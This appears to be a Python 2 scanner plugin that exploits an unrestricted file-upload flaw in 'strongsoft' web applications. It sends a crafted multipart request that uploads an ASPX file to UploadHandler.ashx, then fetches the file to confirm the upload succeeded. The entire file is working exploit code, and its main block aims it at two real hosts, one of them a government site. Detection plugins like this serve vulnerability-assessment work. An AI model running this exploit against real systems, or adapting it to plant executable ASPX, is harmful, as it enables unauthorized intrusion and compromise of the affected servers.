#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = treeoph
import re,urlparse
def assign(service, arg):
    if service=='strongsoft':
        return True,arg

def audit(arg):
    p=urlparse.urlparse(arg)
    raw='''POST /SysManage/AjaxHandler/UploadHandler.ashx HTTP/1.1
Host: {netloc}
Content-Length: 1305
Origin: {scheme}://{netloc}
X-Requested-With: ShockwaveFlash/20.0.0.267
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
Content-Type: multipart/form-data; boundary=----------ei4ae0Ij5cH2gL6cH2GI3KM7Ef1ei4
Accept: */*
Referer: {scheme}://{netloc}/CommonReport/TableList.aspx?TableDBID=1009&pagetype=page&menuid=136
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4

------------ei4ae0Ij5cH2gL6cH2GI3KM7Ef1ei4
Content-Disposition: form-data; name="Filename"

test.aspx
------------ei4ae0Ij5cH2gL6cH2GI3KM7Ef1ei4
Content-Disposition: form-data; name="GetFileName"

y
------------ei4ae0Ij5cH2gL6cH2GI3KM7Ef1ei4
Content-Disposition: form-data; name="DataType"

UploadFile
------------ei4ae0Ij5cH2gL6cH2GI3KM7Ef1ei4
Content-Disposition: form-data; name="GetFileInfo"

y
------------ei4ae0Ij5cH2gL6cH2GI3KM7Ef1ei4
Content-Disposition: form-data; name="UploadFolder"

/CommonReport/
------------ei4ae0Ij5cH2gL6cH2GI3KM7Ef1ei4
Content-Disposition: form-data; name="fileext"

*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.mpp;*.vsd;*.jpg;*.png;*.gif;*.bmp
------------ei4ae0Ij5cH2gL6cH2GI3KM7Ef1ei4
Content-Disposition: form-data; name="TCID"

1009
------------ei4ae0Ij5cH2gL6cH2GI3KM7Ef1ei4
Content-Disposition: form-data; name="folder"

/CommonReport/UploadFile
------------ei4ae0Ij5cH2gL6cH2GI3KM7Ef1ei4
Content-Disposition: form-data; name="Filedata"; filename="test.aspx"
Content-Type: application/octet-stream

GIF89a
testvul
------------ei4ae0Ij5cH2gL6cH2GI3KM7Ef1ei4
Content-Disposition: form-data; name="Upload"

Submit Query
------------ei4ae0Ij5cH2gL6cH2GI3KM7Ef1ei4--'''
    code,head,res,errcode, _=curl.curl2(arg+'SysManage/AjaxHandler/UploadHandler.ashx',raw=raw.format(scheme=p.scheme,netloc=p.netloc))
    if code == 200 and res:
        m=re.search(r'([\w\/\d]+\.aspx)',res)
        if m:
            file_url='http://%s/%s'%(p.netloc,m.group())
            code,head,res,errcode, _=curl.curl2(file_url)
            if 'testvul' in res:
                security_hole("Upload File at "+file_url)

if __name__=='__main__':
    from dummy import *
    audit(assign('strongsoft','http://www.hzwr.gov.cn:8080/')[1])
    audit(assign('strongsoft','http://60.191.198.109:8060/')[1])